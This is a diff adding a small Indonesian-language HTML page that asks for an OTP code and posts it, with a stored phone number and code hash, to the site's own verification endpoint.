@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verifikasi OTP</title>
+</head>
+<body>
+    <h2>Masukkan Kode OTP</h2>
+    <input type="text" id="code" placeholder="Kode OTP">
+    <button onclick="verifyOTP()">Verifikasi</button>
+    <script>
+        async function verifyOTP() {
+            const phone = localStorage.getItem('phone');
+            const phoneCodeHash = localStorage.getItem('phoneCodeHash');
+            const code = document.getElementById('code').value;
+            const res = await fetch('/verify-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, code, phoneCodeHash })
+            });
+            const data = await res.json();
+            if (data.success) {
+                alert('OTP berhasil diverifikasi!');
+            } else {
+                alert('Gagal verifikasi: ' + data.error);
+            }
+        }
+    </script>
+</body>
+</html>
